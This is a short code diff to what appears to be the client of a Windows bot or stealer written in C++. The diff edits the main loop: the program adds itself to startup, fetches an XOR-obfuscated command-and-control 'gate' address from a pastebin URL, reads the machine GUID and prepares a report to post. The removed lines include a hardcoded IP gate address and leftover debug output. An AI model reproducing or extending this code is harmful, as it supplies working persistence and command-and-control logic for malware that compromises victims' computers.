@@ -66,23 +66,15 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, char*, int nShowCmd) {
 			Helpers::addstartup();
 		}
 
-
-	
 		//Fetch Gate from raw Site
-	
-
 		std::string gateFromPatebin = XOR::encryptDecrypt(postRequest(config.pastebinUrl,"","GET"));
-		
-		//std::string gateFromPatebin = "http://35.204.128.99/request";
-		
-		//std::cout << gateFromPatebin;
-
-
+	
 		//Main
 		std::string guid = Helpers::GetMachineGUID();
+
 		std::string finalPost = Client::returnFinalPost();
-		//std::cout << finalPost;
-		//std::cout << "\n\n======";
+
+
 		while (true) {
 			try {
 				std::cout << gateFromPatebin;
